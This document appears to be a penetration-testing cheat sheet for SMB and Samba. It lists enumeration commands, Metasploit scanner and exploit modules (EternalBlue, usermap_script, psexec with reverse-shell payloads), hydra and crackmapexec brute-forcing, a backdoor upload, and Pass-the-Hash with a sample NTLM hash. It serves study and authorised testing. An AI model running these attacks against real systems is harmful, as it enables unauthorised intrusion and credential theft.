# SMB - SAMBA

**SMB (Server Message Block)**
**Description**: Protocol for file and printer sharing across a network, mostly used by Windows systems
**Ports**: TCP 445 (modern), TCP 139 (older with NetBIOS)
**Known Vulnerabilities**: MS17-010 (EternalBlue), SMBGhost (CVE-2020-0796), SMBRelay, PrintNightmare (affects SMB printers)

**Samba**
**Description**: Open-source implementation of SMB protocol for Linux/Unix systems, allowing file/printer sharing with Windows networks
**Ports**: TCP 445, TCP 139, UDP 137-138 (NetBIOS name service)	
**Known Vulnerabilities**: SambaCry (CVE-2017-7494), Remote code execution on misconfigured shares

<br>

# Basic SMB Client Commands

```shell
smbclient //<target>/<share> -N
# Connects anonymously to the specified SMB share on the target (no username/password prompt).

smbclient -L //<target_IP>/ -U <username>
# Lists available SMB shares on the target using provided credentials.

smbclient -L //<target_IP>/ -N
# Lists SMB shares anonymously (no password prompt).

# Connects directly to a specific share
smbclient //<target_IP>/<share_name> -U <username>
# Connects to a specific share — supports commands like list, cd, get, put, exit.

# Other enumeration
rpcclient -U "" -N <target_IP>
# Performs RPC queries anonymously (e.g., user and group enum).

nmblookup -A <target_IP>
# Resolves NetBIOS names and checks if the host is part of a domain or workgroup.

# Before accessing any of the shares, check the permissions of each one
crackmapexec smb <target> -u <user> -p <password> --shares
# Enumerates SMB shares and access rights using given credentials.
```

<br>

# Enumeration

**smbmap**

```shell
smbmap -u <username> -p <password> -H <target_IP>
# Lists accessible SMB shares using credentials.

smbmap -H <ip> -u guest -p "" -d .
# Attempts guest login with blank password in the current domain.

smbmap -H <ip> -u <user> -p <pass> -x 'ipconfig'
# Executes a command on the target system if write and execution permissions exist.

smbmap -H <ip> -u <user> -p <pass> -L
# Lists available shares on the target.

smbmap -H <ip> -u <user> -p <pass> -r 'C$'
# Recursively lists files in the C$ share.

smbmap -H <ip> -u <user> -p <pass> --upload '/root/backdoor' 'C$\backdoor'
# Uploads a file to the specified SMB share path.

smbmap -H <ip> -u <user> -p <pass> --download 'C$\flag.txt'
# Downloads a file from the specified SMB share path.
```

**enum4linux**

```shell
enum4linux -a <target>
# Performs full SMB enumeration (users, shares, OS, groups, etc.).

enum4linux -U <target>
# Enumerates users.

enum4linux -u <username> -p <password> <target_IP>
# Authenticated SMB enumeration.

enum4linux -o <ip>
# Gets OS version.

enum4linux -U <ip>
# Enumerates users (same as -U <target>); use -u -p for authenticated version.

enum4linux -S <ip>
# Enumerates SMB shares.

enum4linux -G <ip>
# Enumerates domain groups.

enum4linux -i <ip>
# Gets printer info.

enum4linux -r -u "admin" -p "password" <ip>
# Enumerates users via RID cycling (SIDs like S-1-22-1-1003).
```

**nmap**

```shell
ls -al /usr/share/nmap/scripts | grep -e "smb"
# Lists available SMB-related scripts in Nmap's script directory.

nmap --script smb-os-discovery -p 445 <target_IP>
# Retrieves OS information via SMB.

nmap -p 445 --script smb-protocols <target_IP>
# Lists supported SMB protocol versions (e.g., SMBv1, SMBv2).

nmap -p 445 --script smb-security-mode <target_IP>
# Checks the SMB security level and authentication modes.

nmap -p 445 --script smb-enum-users <target_IP>
# Attempts to enumerate valid users via SMB.

nmap -p 445 --script smb-enum-sessions --script-args smbusername=<username>,smbpassword=<password> <target_IP>
# Lists active SMB sessions (requires valid credentials).

nmap -p 445 --script smb-enum-shares <target_IP>
# Lists shared folders available via SMB.

nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<username>,smbpassword=<password> <target_IP>
# Lists shares and their contents (auth required).

nmap -p 445 --script smb-server-stats --script-args smbusername=<username>,smbpassword=<password> <target_IP>
# Retrieves server statistics like uptime, sessions, and files shared.

nmap -p 445 --script smb-enum-domains --script-args smbusername=<username>,smbpassword=<password> <target_IP>
# Enumerates Windows domains on the network.

nmap -p 445 --script smb-enum-group --script-args smbusername=<username>,smbpassword=<password> <target_IP>
# Lists groups and their members from the SMB service.
```

<br>

# Metasploit Auxiliary Modules

```shell
use auxiliary/scanner/smb/smb_version
# Detects the SMB version and gathers OS and server information.

use auxiliary/scanner/smb/smb_enumusers
# Enumerates users on the SMB server.

use auxiliary/scanner/smb/smb_enumshares
# Lists shared resources (shares) available on the SMB server.

use auxiliary/scanner/smb/smb2
# Checks if the target supports the SMBv2 protocol.

use auxiliary/scanner/smb/smb_login
# Attempts to authenticate to SMB using provided credentials.
# set CreateSession true → Enables session creation before login (can help bypass some restrictions).

use auxiliary/scanner/smb/pipe_auditor
# Enumerates named pipes over SMB — useful for identifying accessible services and potential escalation vectors.
```

<br>

# Brute-force and Password Attack

```shell
hydra -l <user> -P <pass_wordlist> <target_IP> smb
# Performs SMB brute-force attack using Hydra with a specific username and a password wordlist.

crackmapexec smb <target> -u <user> -p <password_wordlist>
# Attempts to authenticate to SMB using CrackMapExec with one user and a password list (bruteforce).
```

<br>

# Exploiting Vulnerabilities

```shell
# Exploit with psexec
use exploit/windows/smb/psexec
# Executes commands on the target system via SMB using valid credentials.
# set payload windows/x64/meterpreter/reverse_tcp → 64-bit Meterpreter reverse shell.
# set payload windows/meterpreter/reverse_tcp → 32-bit Meterpreter reverse shell.

# Exploit MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
# Scans for systems vulnerable to the EternalBlue exploit (MS17-010).

use exploit/windows/smb/ms17_010_eternalblue
# Exploits the MS17-010 vulnerability to gain remote code execution (typically results in a system-level shell).
```

<br>

# Linux Samba Exploits

```shell
# Exploiting old Samba versions
use exploit/linux/samba/is_known_pipename
# Exploits a command execution vulnerability in Samba (CVE-2017-7494) using a known pipe name.

# Other Samba versions (example: 3.0.20)
search samba 3.0.20
# Searches for exploits targeting Samba version 3.0.20.
use exploit/multi/samba/usermap_script
# Exploits Samba 3.0.20 (and similar) via a username map script injection vulnerability (CVE-2007-2447).
```

<br>

# Pass-the-Hash & PsExec Attack

```shell
# Pass-the-Hash example
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec:::
# NTLM hash format used for Pass-the-Hash attacks.
# Hash to use: aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec

# Python Impacket PsExec
cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
# Copies the Impacket PsExec script to your Desktop.

chmod +x psexec.py
# Makes the script executable.

python3 psexec.py Administrator@<target_IP>
# Runs PsExec to execute commands remotely — will prompt for password or allow hash injection if configured.
```
